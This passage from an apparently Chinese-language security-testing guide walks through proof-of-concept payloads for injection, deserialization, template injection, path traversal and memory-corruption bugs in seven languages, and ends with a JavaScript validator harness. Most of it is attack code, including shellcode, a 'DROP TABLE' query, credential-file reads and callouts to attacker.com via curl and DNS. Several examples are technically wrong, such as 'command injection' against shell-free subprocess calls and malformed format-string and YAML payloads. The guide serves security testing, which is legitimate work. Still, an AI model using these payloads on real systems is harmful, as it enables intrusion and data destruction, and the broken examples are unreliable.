    $url3 = $baseUrl . '/index.php?page=' . urlencode($payload3);
    $response3 = file_get_contents($url3);
    echo "PHP wrapper: " . substr($response3, 0, 100) . "\n";

    // PoC 4: 日志文件包含
    $payload4 = '/var/log/apache2/access.log';
    $url4 = $baseUrl . '/index.php?page=' . urlencode($payload4);
    $response4 = file_get_contents($url4);
    echo "Log file inclusion: " . substr($response4, 0, 100) . "\n";
}

testFileInclusion('http://localhost:8000');
?>
```

#### 3. 命令注入

**漏洞场景**：
```php
// vulnerable.php
<?php
$file = $_GET['file'];
system('cat ' . $file);
?>
```

**PoC 验证**：
```php
// poc/command_injection.php
<?php
function testCommandInjection($baseUrl) {
    // PoC 1: 分号注入
    $payload1 = 'file.txt; whoami;';
    $url1 = $baseUrl . '/read.php?file=' . urlencode($payload1);
    $response1 = file_get_contents($url1);
    echo "Semicolon injection: " . substr($response1, 0, 100) . "\n";

    // PoC 2: 管道注入
    $payload2 = 'file.txt | whoami';
    $url2 = $baseUrl . '/read.php?file=' . urlencode($payload2);
    $response2 = file_get_contents($url2);
    echo "Pipe injection: " . substr($response2, 0, 100) . "\n";

    // PoC 3: 反引号注入
    $payload3 = 'file.txt`whoami`';
    $url3 = $baseUrl . '/read.php?file=' . urlencode($payload3);
    $response3 = file_get_contents($url3);
    echo "Backtick injection: " . substr($response3, 0, 100) . "\n";

    // PoC 4: 命令替换
    $payload4 = 'file.txt $(whoami)';
    $url4 = $baseUrl . '/read.php?file=' . urlencode($payload4);
    $response4 = file_get_contents($url4);
    echo "Command substitution: " . substr($response4, 0, 100) . "\n";
}

testCommandInjection('http://localhost:8000');
?>
```

#### 4. 反序列化

**漏洞场景**：
```php
// vulnerable.php
<?php
$data = $_POST['data'];
$obj = unserialize($data);
?>
```

**PoC 验证**：
```php
// poc/deserialization.php
<?php
class Shell {
    function __wakeup() {
        system('whoami');
    }
}

function testDeserialization($baseUrl) {
    // PoC 1: 自动加载类
    $payload1 = serialize(new Shell());
    $postData1 = ['data' => $payload1];
    $options1 = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($postData1)
        ]
    ];
    $response1 = file_get_contents($baseUrl . '/unserialize.php', false, stream_context_create($options1));
    echo "Autoload class deserialization: " . substr($response1, 0, 100) . "\n";

    // PoC 2: Phar 反序列化
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'test');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata(new Shell());
    $phar->stopBuffering();
    echo "Phar deserialization payload generated\n";

    // PoC 3: SoapClient 反序列化
    class SoapClient {
        private $url = 'http://attacker.com/soap';
        function __wakeup() {
            file_get_contents($this->url);
        }
    }
    $payload3 = serialize(new SoapClient());
    $postData3 = ['data' => $payload3];
    $options3 = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($postData3)
        ]
    ];
    file_get_contents($baseUrl . '/unserialize.php', false, stream_context_create($options3));
    echo "SoapClient deserialization attempt completed\n";
}

testDeserialization('http://localhost:8000');
?>
```

### 验证流程

```
1. 环境准备
   - 配置 PHP-FPM/Apache
   - 准备测试数据库
   - 准备测试文件

2. PoC 编写
   - 分析框架（Laravel/ThinkPHP/Yii）
   - 构造恶意输入
   - 编写测试脚本

3. 执行验证
   - 发送 HTTP 请求
   - 监控响应
   - 检查文件系统

4. 结果分析
   - 检查 HTTP 响应
   - 检查 PHP 错误日志
   - 检查文件系统变化
   - 记录漏洞证据
```

---

## Go 应用 PoC 验证

### 特点分析

**运行环境**：Go 运行时
**入口点**：HTTP 请求、CLI 参数
**特权级别**：当前用户权限
**攻击面**：
1. SQL 注入
2. 命令注入
3. 路径遍历
4. 反序列化
5. 模板注入

### 常见漏洞类型

#### 1. SQL 注入

**漏洞场景**：
```go
// vulnerable.go
func GetUser(db *sql.DB, id string) (*User, error) {
    query := fmt.Sprintf("SELECT * FROM users WHERE id = %s", id)
    row := db.QueryRow(query)
    var user User
    err := row.Scan(&user.ID, &user.Name, &user.Email)
    return &user, err
}
```

**PoC 验证**：
```go
// poc/sql_injection.go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "io/ioutil"
    "time"
)

func testSQLInjection(baseUrl string) {
    // PoC 1: UNION 查询
    payload1 := "1 UNION SELECT username, password FROM users"
    url1 := baseUrl + "/user?id=" + url.QueryEscape(payload1)
    resp1, _ := http.Get(url1)
    body1, _ := ioutil.ReadAll(resp1.Body)
    fmt.Println("Union-based injection:", string(body1[:100]))

    // PoC 2: 基于时间的盲注
    payload2 := "1' AND SLEEP(5)--"
    url2 := baseUrl + "/user?id=" + url.QueryEscape(payload2)
    start := time.Now()
    http.Get(url2)
    elapsed := time.Since(start)
    if elapsed > 5*time.Second {
        fmt.Println("Time-based blind injection confirmed")
    }

    // PoC 3: 堆叠查询
    payload3 := "1; DROP TABLE users--"
    url3 := baseUrl + "/user?id=" + url.QueryEscape(payload3)
    resp3, _ := http.Get(url3)
    body3, _ := ioutil.ReadAll(resp3.Body)
    fmt.Println("Stacked queries:", string(body3[:100]))
}

func main() {
    testSQLInjection("http://localhost:8080")
}
```

#### 2. 模板注入

**漏洞场景**：
```go
// vulnerable.go
import "html/template"

func renderTemplate(name string, data interface{}) string {
    tmpl, _ := template.New(name).Parse(name)
    var buf bytes.Buffer
    tmpl.Execute(&buf, data)
    return buf.String()
}
```

**PoC 验证**：
```go
// poc/template_injection.go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "io/ioutil"
)

func testTemplateInjection(baseUrl string) {
    // PoC 1: SSTI（服务器端模板注入）
    payload1 := "{{.}}"
    url1 := baseUrl + "/render?template=" + url.QueryEscape(payload1)
    resp1, _ := http.Get(url1)
    body1, _ := ioutil.ReadAll(resp1.Body)
    fmt.Println("SSTI test:", string(body1[:100]))

    // PoC 2: Go template 注入
    payload2 := "{{.Env}}"
    url2 := baseUrl + "/render?template=" + url.QueryEscape(payload2)
    resp2, _ := http.Get(url2)
    body2, _ := ioutil.ReadAll(resp2.Body)
    fmt.Println("Go template injection:", string(body2[:100]))

    // PoC 3: 模板函数调用
    payload3 := "{{call .Func \"arg1\" \"arg2\"}}"
    url3 := baseUrl + "/render?template=" + url.QueryEscape(payload3)
    resp3, _ := http.Get(url3)
    body3, _ := ioutil.ReadAll(resp3.Body)
    fmt.Println("Template function call:", string(body3[:100]))
}

func main() {
    testTemplateInjection("http://localhost:8080")
}
```

#### 3. 路径遍历

**漏洞场景**：
```go
// vulnerable.go
func readFile(filename string) ([]byte, error) {
    return ioutil.ReadFile(filename)
}
```

**PoC 验证**：
```go
// poc/path_traversal.go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "io/ioutil"
)

func testPathTraversal(baseUrl string) {
    // PoC 1: 向上遍历
    payload1 := "../../../etc/passwd"
    url1 := baseUrl + "/read?file=" + url.QueryEscape(payload1)
    resp1, _ := http.Get(url1)
    body1, _ := ioutil.ReadAll(resp1.Body)
    if len(body1) > 0 {
        fmt.Println("Path traversal confirmed:", string(body1[:50]))
    }

    // PoC 2: 绝对路径
    payload2 := "/etc/passwd"
    url2 := baseUrl + "/read?file=" + url.QueryEscape(payload2)
    resp2, _ := http.Get(url2)
    body2, _ := ioutil.ReadAll(resp2.Body)
    fmt.Println("Absolute path:", string(body2[:50]))

    // PoC 3: Windows 路径遍历
    payload3 := "..\\..\\..\\windows\\system32\\config\\sam"
    url3 := baseUrl + "/read?file=" + url.QueryEscape(payload3)
    resp3, _ := http.Get(url3)
    body3, _ := ioutil.ReadAll(resp3.Body)
    fmt.Println("Windows path traversal:", string(body3[:50]))
}

func main() {
    testPathTraversal("http://localhost:8080")
}
```

### 验证流程

```
1. 环境准备
   - 构建 Go 应用
   - 启动 HTTP 服务器
   - 准备测试数据

2. PoC 编写
   - 分析 Gin/Echo/Fiber 框架
   - 构造恶意输入
   - 编写测试代码

3. 执行验证
   - 发送 HTTP 请求
   - 监控响应
   - 检查文件系统

4. 结果分析
   - 检查 HTTP 响应
   - 检查 Go 日志
   - 检查文件系统变化
   - 记录漏洞证据
```

---

## Python 应用 PoC 验证

### 特点分析

**运行环境**：Python 解释器
**入口点**：HTTP 请求、CLI 参数
**特权级别**：当前用户权限
**攻击面**：
1. SQL 注入
2. 命令注入
3. 反序列化（pickle）
4. 模板注入（Jinja2）
5. 代码注入

### 常见漏洞类型

#### 1. Pickle 反序列化

**漏洞场景**：
```python
# vulnerable.py
import pickle

def deserialize(data):
    return pickle.loads(data)
```

**PoC 验证**：
```python
# poc/pickle_deserialization.py
import pickle
import base64
import requests

def testPickleDeserialization(baseUrl):
    # PoC 1: 执行系统命令
    class Shell:
        def __reduce__(self):
            return (eval, ("__import__('os').system('whoami')",))

    payload = pickle.dumps(Shell())
    payload_b64 = base64.b64encode(payload).decode()

    resp = requests.post(baseUrl + '/deserialize', json={'data': payload_b64})
    print("Pickle deserialization attempt completed")

    # PoC 2: DNS 外带
    class DNSOutbound:
        def __reduce__(self):
            return (eval, ("__import__('socket').gethostbyname('attacker.com')",))

    payload2 = pickle.dumps(DNSOutbound())
    payload_b64_2 = base64.b64encode(payload2).decode()

    resp2 = requests.post(baseUrl + '/deserialize', json={'data': payload_b64_2})
    print("DNS outbound attempt completed")

    # PoC 3: 写入文件
    class WriteFile:
        def __reduce__(self):
            return (eval, ("open('/tmp/pwn.txt', 'w').write('You have been pwned!')",))

    payload3 = pickle.dumps(WriteFile())
    payload_b64_3 = base64.b64encode(payload3).decode()

    resp3 = requests.post(baseUrl + '/deserialize', json={'data': payload_b64_3})
    print("File write attempt completed")

testPickleDeserialization('http://localhost:5000')
```

#### 2. Jinja2 模板注入

**漏洞场景**：
```python
# vulnerable.py
from jinja2 import Template

def render(template_str):
    template = Template(template_str)
    return template.render()
```

**PoC 验证**：
```python
# poc/jinja2_ssti.py
import requests

def testJinja2SSTI(baseUrl):
    # PoC 1: 读取配置
    payload1 = "{{config}}"
    resp1 = requests.get(baseUrl + '/render', params={'template': payload1})
    print("Config access:", resp1.text[:100])

    # PoC 2: 执行 Python 代码
    payload2 = "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}"
    resp2 = requests.get(baseUrl + '/render', params={'template': payload2})
    print("Code execution:", resp2.text[:100])

    # PoC 3: 读取文件
    payload3 = "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
    resp3 = requests.get(baseUrl + '/render', params={'template': payload3})
    print("File read:", resp3.text[:100])

    # PoC 4: DNS 外带
    payload4 = "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(104)|attr('__init__')|attr('__globals__')|attr('__getitem__')('sys')|attr('modules')|attr('__getitem__')('os')|attr('popen')('curl attacker.com')|attr('read')()}}"
    resp4 = requests.get(baseUrl + '/render', params={'template': payload4})
    print("DNS outbound attempt completed")

testJinja2SSTI('http://localhost:5000')
```

#### 3. 命令注入

**漏洞场景**：
```python
# vulnerable.py
import subprocess

def execute_command(filename):
    return subprocess.run(['cat', filename], capture_output=True)
```

**PoC 验证**：
```python
# poc/command_injection.py
import requests

def testCommandInjection(baseUrl):
    # PoC 1: 分号注入
    payload1 = "file.txt; whoami;"
    resp1 = requests.get(baseUrl + '/read', params={'file': payload1})
    print("Semicolon injection:", resp1.text[:100])

    # PoC 2: 管道注入
    payload2 = "file.txt | whoami"
    resp2 = requests.get(baseUrl + '/read', params={'file': payload2})
    print("Pipe injection:", resp2.text[:100])

    # PoC 3: 命令替换
    payload3 = "file.txt $(whoami)"
    resp3 = requests.get(baseUrl + '/read', params={'file': payload3})
    print("Command substitution:", resp3.text[:100])

    # PoC 4: 反引号注入
    payload4 = "file.txt`whoami`"
    resp4 = requests.get(baseUrl + '/read', params={'file': payload4})
    print("Backtick injection:", resp4.text[:100])

testCommandInjection('http://localhost:5000')
```

### 验证流程

```
1. 环境准备
   - 安装 Python 依赖
   - 启动 Flask/Django/FastAPI
   - 准备测试数据

2. PoC 编写
   - 分析框架（Flask/Django/FastAPI）
   - 构造恶意输入
   - 编写测试脚本

3. 执行验证
   - 发送 HTTP 请求
   - 监控响应
   - 检查文件系统

4. 结果分析
   - 检查 HTTP 响应
   - 检查 Python 日志
   - 检查文件系统变化
   - 记录漏洞证据
```

---

## Rust 应用 PoC 验证

### 特点分析

**运行环境**：Rust 运行时
**入口点**：HTTP 请求、CLI 参数
**特权级别**：当前用户权限
**攻击面**：
1. SQL 注入
2. 命令注入
3. 路径遍历
4. 反序列化
5. 模板注入

### 常见漏洞类型

#### 1. SQL 注入

**漏洞场景**：
```rust
// vulnerable.rs
use sqlx::SqlitePool;

async fn get_user(pool: &SqlitePool, id: &str) -> Result<User, sqlx::Error> {
    let query = format!("SELECT * FROM users WHERE id = {}", id);
    let user = sqlx::query_as::<_, User>(&query)
        .fetch_one(pool)
        .await?;
    Ok(user)
}
```

**PoC 验证**：
```rust
// poc/sql_injection.rs
use reqwest::blocking::Client;
use std::time::Instant;

fn test_sql_injection(base_url: &str) {
    let client = Client::new();

    // PoC 1: UNION 查询
    let payload1 = "1 UNION SELECT username, password FROM users";
    let url1 = format!("{}/user?id={}", base_url, urlencoding::encode(payload1));
    let resp1 = client.get(&url1).send().unwrap();
    let body1 = resp1.text().unwrap();
    println!("Union-based injection: {}", &body1[..100.min(body1.len())]);

    // PoC 2: 基于时间的盲注
    let payload2 = "1' AND SLEEP(5)--";
    let url2 = format!("{}/user?id={}", base_url, urlencoding::encode(payload2));
    let start = Instant::now();
    client.get(&url2).send().unwrap();
    let elapsed = start.elapsed();
    if elapsed.as_secs() > 5 {
        println!("Time-based blind injection confirmed");
    }

    // PoC 3: 堆叠查询
    let payload3 = "1; DROP TABLE users--";
    let url3 = format!("{}/user?id={}", base_url, urlencoding::encode(payload3));
    let resp3 = client.get(&url3).send().unwrap();
    let body3 = resp3.text().unwrap();
    println!("Stacked queries: {}", &body3[..100.min(body3.len())]);
}

fn main() {
    test_sql_injection("http://localhost:8080");
}
```

#### 2. 命令注入

**漏洞场景**：
```rust
// vulnerable.rs
use std::process::Command;

fn execute_command(filename: &str) -> String {
    let output = Command::new("cat")
        .arg(filename)
        .output()
        .expect("Failed to execute command");
    String::from_utf8_lossy(&output.stdout).to_string()
}
```

**PoC 验证**：
```rust
// poc/command_injection.rs
use reqwest::blocking::Client;

fn test_command_injection(base_url: &str) {
    let client = Client::new();

    // PoC 1: 分号注入
    let payload1 = "file.txt; whoami;";
    let url1 = format!("{}/read?file={}", base_url, urlencoding::encode(payload1));
    let resp1 = client.get(&url1).send().unwrap();
    let body1 = resp1.text().unwrap();
    println!("Semicolon injection: {}", &body1[..100.min(body1.len())]);

    // PoC 2: 管道注入
    let payload2 = "file.txt | whoami";
    let url2 = format!("{}/read?file={}", base_url, urlencoding::encode(payload2));
    let resp2 = client.get(&url2).send().unwrap();
    let body2 = resp2.text().unwrap();
    println!("Pipe injection: {}", &body2[..100.min(body2.len())]);

    // PoC 3: 命令替换
    let payload3 = "file.txt $(whoami)";
    let url3 = format!("{}/read?file={}", base_url, urlencoding::encode(payload3));
    let resp3 = client.get(&url3).send().unwrap();
    let body3 = resp3.text().unwrap();
    println!("Command substitution: {}", &body3[..100.min(body3.len())]);
}

fn main() {
    test_command_injection("http://localhost:8080");
}
```

### 验证流程

```
1. 环境准备
   - 构建 Rust 应用（cargo build）
   - 启动 HTTP 服务器
   - 准备测试数据

2. PoC 编写
   - 分析框架（Actix、Rocket、Warp）
   - 构造恶意输入
   - 编写测试代码

3. 执行验证
   - 发送 HTTP 请求
   - 监控响应
   - 检查文件系统

4. 结果分析
   - 检查 HTTP 响应
   - 检查 Rust 日志
   - 检查文件系统变化
   - 记录漏洞证据
```

---

## Ruby 应用 PoC 验证

### 特点分析

**运行环境**：Ruby 解释器
**入口点**：HTTP 请求、CLI 参数
**特权级别**：当前用户权限
**攻击面**：
1. SQL 注入
2. 反序列化（YAML）
3. 命令注入
4. ERB 模板注入
5. 类型混淆

### 常见漏洞类型

#### 1. YAML 反序列化

**漏洞场景**：
```ruby
# vulnerable.rb
require 'yaml'

def deserialize(data)
  YAML.load(data)
end
```

**PoC 验证**：
```ruby
# poc/yaml_deserialization.rb
require 'yaml'
require 'net/http'
require 'uri'

def test_yaml_deserialization(base_url)
  # PoC 1: 执行系统命令
  payload1 = "--- !ruby/object:Gem::Installer\ni: x\n" +
              "  o: !ruby/object:Gem::Dependency\n" +
              "    name: !ruby/object:Gem::Requirement\n" +
              "      requirements:\n" +
              "        - - \">\"\n" +
              "          - !ruby/object:Gem::Version\n" +
              "            version: '1.0'\n"

  uri1 = URI.parse("#{base_url}/deserialize")
  req1 = Net::HTTP::Post.new(uri1)
  req1['Content-Type'] = 'application/x-yaml'
  req1.body = payload1

  res1 = Net::HTTP.start(uri1.hostname, uri1.port) do |http|
    http.request(req1)
  end

  puts "YAML deserialization attempt completed"

  # PoC 2: DNS 外带
  payload2 = "--- !ruby/object:Gem::Dependency\n" +
              "  name: !ruby/object:Gem::Version\n" +
              "    version: !ruby/object:Gem::Requirement\n" +
              "      requirements:\n" +
              "        - - \">\"\n" +
              "          - !ruby/object:Gem::Version\n" +
              "            version: '1.0'\n"

  uri2 = URI.parse("#{base_url}/deserialize")
  req2 = Net::HTTP::Post.new(uri2)
  req2['Content-Type'] = 'application/x-yaml'
  req2.body = payload2

  res2 = Net::HTTP.start(uri2.hostname, uri2.port) do |http|
    http.request(req2)
  end

  puts "DNS outbound attempt completed"
end

test_yaml_deserialization('http://localhost:3000')
```

#### 2. ERB 模板注入

**漏洞场景**：
```ruby
# vulnerable.rb
require 'erb'

def render(template_str)
  ERB.new(template_str).result
end
```

**PoC 验证**：
```ruby
# poc/erb_ssti.rb
require 'net/http'
require 'uri'

def test_erb_ssti(base_url)
  # PoC 1: 执行 Ruby 代码
  payload1 = "<%= system('whoami') %>"
  uri1 = URI.parse("#{base_url}/render?template=#{URI.encode_www_form_component(payload1)}")
  res1 = Net::HTTP.get_response(uri1)
  puts "ERB code execution: #{res1.body[0, 100]}"

  # PoC 2: 读取文件
  payload2 = "<%= File.read('/etc/passwd') %>"
  uri2 = URI.parse("#{base_url}/render?template=#{URI.encode_www_form_component(payload2)}")
  res2 = Net::HTTP.get_response(uri2)
  puts "File read: #{res2.body[0, 100]}"

  # PoC 3: DNS 外带
  payload3 = "<%= require 'socket'; Socket.gethostbyname('attacker.com') %>"
  uri3 = URI.parse("#{base_url}/render?template=#{URI.encode_www_form_component(payload3)}")
  res3 = Net::HTTP.get_response(uri3)
  puts "DNS outbound attempt completed"
end

test_erb_ssti('http://localhost:3000')
```

### 验证流程

```
1. 环境准备
   - 安装 Ruby 依赖
   - 启动 Rails/Sinatra
   - 准备测试数据

2. PoC 编写
   - 分析框架（Rails/Sinatra）
   - 构造恶意输入
   - 编写测试脚本

3. 执行验证
   - 发送 HTTP 请求
   - 监控响应
   - 检查文件系统

4. 结果分析
   - 检查 HTTP 响应
   - 检查 Ruby 日志
   - 检查文件系统变化
   - 记录漏洞证据
```

---

## C/C++ 应用 PoC 验证

### 特点分析

**运行环境**：原生执行
**入口点**：HTTP 请求、CLI 参数、网络数据包
**特权级别**：当前用户权限（可能提升到 root）
**攻击面**：
1. 缓冲区溢出
2. 格式化字符串
3. 整数溢出
4. UAF（Use After Free）
5. 双重释放

### 常见漏洞类型

#### 1. 缓冲区溢出

**漏洞场景**：
```c
// vulnerable.c
#include <string.h>
#include <stdio.h>

void copy_string(char* input) {
    char buffer[100];
    strcpy(buffer, input);
    printf("Copied: %s\n", buffer);
}
```

**PoC 验证**：
```c
// poc/buffer_overflow.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void test_buffer_overflow() {
    // PoC 1: 简单溢出
    char payload1[150];
    memset(payload1, 'A', 149);
    payload1[149] = '\0';
    printf("Payload 1: %zu bytes\n", strlen(payload1));

    // PoC 2: 返回地址覆盖
    char payload2[150];
    memset(payload2, 'A', 100);
    // 添加返回地址（根据实际地址调整）
    unsigned int* ret_addr = (unsigned int*)(payload2 + 100);
    *ret_addr = 0x0804a0b0;  // 示例地址
    payload2[148] = '\0';

    printf("Payload 2: %zu bytes\n", strlen(payload2));

    // PoC 3: Shellcode 注入
    char payload3[150];
    memset(payload3, '\x90', 100);  // NOP sled
    // 添加 shellcode（示例）
    unsigned char shellcode[] = {
        0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
        0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
        0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
    };
    memcpy(payload3 + 100, shellcode, sizeof(shellcode));
    payload3[100 + sizeof(shellcode)] = '\0';

    printf("Payload 3: %zu bytes\n", strlen(payload3));
}

int main() {
    test_buffer_overflow();
    return 0;
}
```

#### 2. 格式化字符串

**漏洞场景**：
```c
// vulnerable.c
#include <stdio.h>

void print_string(char* input) {
    printf(input);
}
```

**PoC 验证**：
```c
// poc/format_string.c
#include <stdio.h>
#include <stdlib.h>

void test_format_string() {
    // PoC 1: 读取栈内存
    char payload1[] = "%08x.%08x.%08x.%08x";
    printf("Payload 1: %s\n", payload1);

    // PoC 2: 读取任意地址
    char payload2[100];
    sprintf(payload2, "%%08x.%%08x.%%s", 0x0804a0b0);  // 目标地址
    printf("Payload 2: %s\n", payload2);

    // PoC 3: 写入任意地址
    char payload3[100];
    sprintf(payload3, "%%n", 0x0804a0b0, 0x41414141);  // 地址和值
    printf("Payload 3: %s\n", payload3);

    // PoC 4: 覆盖 GOT 表
    char payload4[100];
    sprintf(payload4, "%%n", 0x0804a000, 0x41414141);  // GOT 地址
    printf("Payload 4: %s\n", payload4);
}

int main() {
    test_format_string();
    return 0;
}
```

### 验证流程

```
1. 环境准备
   - 编译 C/C++ 程序（关闭保护机制）
   - 准备测试环境
   - 配置调试工具（gdb、objdump）

2. PoC 编写
   - 分析二进制文件
   - 识别漏洞类型
   - 构造恶意输入
   - 编写利用代码

3. 执行验证
   - 运行漏洞程序
   - 输入恶意数据
   - 监控程序行为
   - 检查是否获得控制权

4. 结果分析
   - 检查是否执行恶意代码
   - 检查是否泄露敏感信息
   - 检查是否导致崩溃
   - 记录漏洞证据
```

---

## Swift 应用 PoC 验证

### 特点分析

**运行环境**：Swift 运行时 / iOS/macOS
**入口点**：HTTP 请求、用户输入、IPC 消息
**特权级别**：应用权限（可能提升）
**攻击面**：
1. SQL 注入（CoreData）
2. XSS（WebView）
3. 命令注入
4. IPC 注入
5. 反序列化

### 常见漏洞类型

#### 1. CoreData SQL 注入

**漏洞场景**：
```swift
// vulnerable.swift
import CoreData

func fetchUser(id: String) -> User? {
    let predicate = NSPredicate(format: "id == \(id)")
    let request = NSFetchRequest<NSManagedObject>(entityName: "User")
    request.predicate = predicate
    // ...
}
```

**PoC 验证**：
```swift
// poc/coredata_injection.swift
import Foundation
import CoreData

func testCoreDataInjection(context: NSManagedObjectContext) {
    // PoC 1: UNION 查询
    let payload1 = "1 UNION SELECT * FROM users"
    let predicate1 = NSPredicate(format: "id == \(payload1)")
    let request1 = NSFetchRequest<NSManagedObject>(entityName: "User")
    request1.predicate = predicate1

    do {
        let results = try context.fetch(request1)
        print("Union-based injection: \(results)")
    } catch {
        print("Injection failed: \(error)")
    }

    // PoC 2: 基于时间的盲注
    let payload2 = "1' AND SLEEP(5)--"
    let predicate2 = NSPredicate(format: "id == \(payload2)")
    let request2 = NSFetchRequest<NSManagedObject>(entityName: "User")
    request2.predicate = predicate2

    let start = Date()
    do {
        let results = try context.fetch(request2)
        let elapsed = Date().timeIntervalSince(start)
        if elapsed > 5 {
            print("Time-based blind injection confirmed")
        }
    } catch {
        print("Injection failed: \(error)")
    }
}
```

#### 2. WebView XSS

**漏洞场景**：
```swift
// vulnerable.swift
import WebKit

func loadHTML(html: String) {
    webView.loadHTMLString(html, baseURL: nil)
}
```

**PoC 验证**：
```swift
// poc/webview_xss.swift
import WebKit

func testWebViewXSS(webView: WKWebView) {
    // PoC 1: 简单 script 注入
    let payload1 = "<script>alert('XSS')</script>"
    webView.loadHTMLString(payload1, baseURL: nil)

    // PoC 2: 事件处理器注入
    let payload2 = "<img src=x onerror=alert('XSS')>"
    webView.loadHTMLString(payload2, baseURL: nil)

    // PoC 3: SVG 注入
    let payload3 = "<svg onload=alert('XSS')>"
    webView.loadHTMLString(payload3, baseURL: nil)

    // PoC 4: URL scheme 注入
    let payload4 = "<iframe src='javascript:alert(\"XSS\")'>"
    webView.loadHTMLString(payload4, baseURL: nil)
}
```

#### 3. IPC 注入

**漏洞场景**：
```swift
// vulnerable.swift
import Foundation

func executeCommand(command: String) {
    let task = Process()
    task.launchPath = "/bin/sh"
    task.arguments = ["-c", command]
    task.launch()
}
```

**PoC 验证**：
```swift
// poc/ipc_injection.swift
import Foundation

func testIPCInjection() {
    // PoC 1: 分号注入
    let payload1 = "echo test; whoami;"
    executeCommand(command: payload1)

    // PoC 2: 管道注入
    let payload2 = "echo test | whoami"
    executeCommand(command: payload2)

    // PoC 3: 命令替换
    let payload3 = "echo test $(whoami)"
    executeCommand(command: payload3)

    // PoC 4: 反引号注入
    let payload4 = "echo test `whoami`"
    executeCommand(command: payload4)
}
```

### 验证流程

```
1. 环境准备
   - 构建 Swift 应用
   - 配置 iOS/macOS 模拟器
   - 准备测试数据

2. PoC 编写
   - 分析应用结构
   - 构造恶意输入
   - 编写测试代码

3. 执行验证
   - 运行应用
   - 输入恶意数据
   - 监控应用行为
   - 检查日志输出

4. 结果分析
   - 检查是否执行恶意代码
   - 检查是否泄露敏感信息
   - 检查 WebView 内容
   - 记录漏洞证据
```

---

### 自动化验证工具

```javascript
// poc_validator.js

class PoCValidator {
  constructor(config) {
    this.projectType = config.projectType;
    this.baseUrl = config.baseUrl;
    this.entryPoints = config.entryPoints;
  }

  async runAllTests() {
    const results = [];

    for (const entryPoint of this.entryPoints) {
      const testResults = await this.testEntryPoint(entryPoint);
      results.push(...testResults);
    }

    return this.generateReport(results);
  }

  async testEntryPoint(entryPoint) {
    const testCases = this.getTestCases(entryPoint);
    const results = [];

    for (const testCase of testCases) {
      try {
        const result = await this.executeTestCase(testCase);
        results.push(result);
      } catch (error) {
        results.push({
          testCase,
          status: 'error',
          error: error.message
        });
      }
    }

    return results;
  }

  getTestCases(entryPoint) {
    // 根据项目类型返回测试用例
    switch (this.projectType) {
      case 'vscode-extension':
        return this.getVSCodeTestCases(entryPoint);
      case 'web-app':
        return this.getWebTestCases(entryPoint);
      case 'electron-app':
        return this.getElectronTestCases(entryPoint);
      case 'nodejs-cli':
        return this.getCLITestCases(entryPoint);
      case 'java-app':
        return this.getJavaTestCases(entryPoint);
      case 'php-app':
        return this.getPHPTestCases(entryPoint);
      case 'python-app':
        return this.getPythonTestCases(entryPoint);
      case 'go-app':
        return this.getGoTestCases(entryPoint);
      case 'rust-app':
        return this.getRustTestCases(entryPoint);
      case 'ruby-app':
        return this.getRubyTestCases(entryPoint);
      case 'cpp-app':
        return this.getCppTestCases(entryPoint);
      case 'swift-app':
        return this.getSwiftTestCases(entryPoint);
      default:
        return [];
    }
  }

  generateReport(results) {
    return {
      summary: {
        total: results.length,
        passed: results.filter(r => r.status === 'vulnerable').length,
        failed: results.filter(r => r.status === 'not_vulnerable').length,
        error: results.filter(r => r.status === 'error').length
      },
      details: results
    };
  }
}

module.exports = PoCValidator;
```

### 使用示例

```javascript
// run_poc.js

import PoCValidator from './poc_validator.js';

const config = {
  projectType: 'vscode-extension',
  baseUrl: null,  // CLI 工具不需要
  entryPoints: [
    {
      type: 'command',
      name: 'extension.runScript',
      params: ['scriptPath']
    },
    {
      type: 'command',
      name: 'extension.readFile',
      params: ['filePath']
    }
  ]
};

const validator = new PoCValidator(config);
const report = await validator.runAllTests();
console.log(JSON.stringify(report, null, 2));
```

### 其他语言项目使用示例

```javascript
// Java 项目示例
const javaConfig = {
  projectType: 'java-app',
  baseUrl: 'http://localhost:8080',
  entryPoints: [
    {
      type: 'rest-api',
      path: '/api/user',
      method: 'GET',
      params: ['id']
    },
    {
      type: 'rest-api',
      path: '/api/deserialize',
      method: 'POST',
      body: ['data']
    }
  ]
};

// PHP 项目示例
const phpConfig = {
  projectType: 'php-app',
  baseUrl: 'http://localhost:8000',
  entryPoints: [
    {
      type: 'http',
      path: '/index.php',
      method: 'GET',
      params: ['page']
    },
    {
      type: 'http',
      path: '/upload.php',
      method: 'POST',
      files: ['file']
    }
  ]
};

// Python 项目示例
const pythonConfig = {
  projectType: 'python-app',
  baseUrl: 'http://localhost:5000',
  entryPoints: [
    {
      type: 'http',
      path: '/deserialize',
      method: 'POST',
      body: ['data']
    },
    {
      type: 'http',
      path: '/render',
      method: 'GET',
      params: ['template']
    }
  ]
};

// Go 项目示例
const goConfig = {
  projectType: 'go-app',
  baseUrl: 'http://localhost:8080',
  entryPoints: [
    {
      type: 'http',
      path: '/user',
      method: 'GET',
      params: ['id']
    },
    {
      type: 'http',
      path: '/render',
      method: 'GET',
      params: ['template']
    }
  ]
};

// Rust 项目示例
const rustConfig = {
  projectType: 'rust-app',
  baseUrl: 'http://localhost:8080',
  entryPoints: [
    {
      type: 'http',
      path: '/user',
      method: 'GET',
      params: ['id']
    },
    {
      type: 'http',
      path: '/read',
      method: 'GET',
      params: ['file']
    }
  ]
};

// Ruby 项目示例
const rubyConfig = {
  projectType: 'ruby-app',
  baseUrl: 'http://localhost:3000',
  entryPoints: [
    {
      type: 'http',
      path: '/deserialize',
      method: 'POST',
      body: ['data']
    },
    {
